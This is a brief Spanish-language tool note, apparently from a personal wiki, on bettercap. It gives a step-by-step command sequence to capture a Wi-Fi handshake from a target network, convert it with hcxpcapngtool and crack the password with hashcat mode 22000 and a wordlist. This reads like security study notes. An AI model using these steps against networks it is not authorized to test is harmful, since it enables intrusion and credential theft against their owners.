Herramienta para monitorear y capturar trafico de red

# Ejemplos de uso
## Captura handshakes + hashcat
Para este ejemplo, la tarjeta de red debe estar previamente configurada en modo monitor
`sudo bettercap`
`set wifi.interface (nombre interfaz)`
`set wifi.handshakes.file (archivo .pcap de output)`
`wifi.recon on`
`wifi.show`
`events.stream off`
`wifi.assoc ([[BSSID]] de la red objetivo)`
`events.stream on`
`exit`
`[[hcxpcapngtool]] -o (archivo para output) (archivo .pcap anterior)` 
`hashcat -m 22000 (output del comando aterior) (diccionario)`
En este caso, el 22000 esta estableciendo el tipo de [[hash]], el usado es el correspondiente a protocolos de red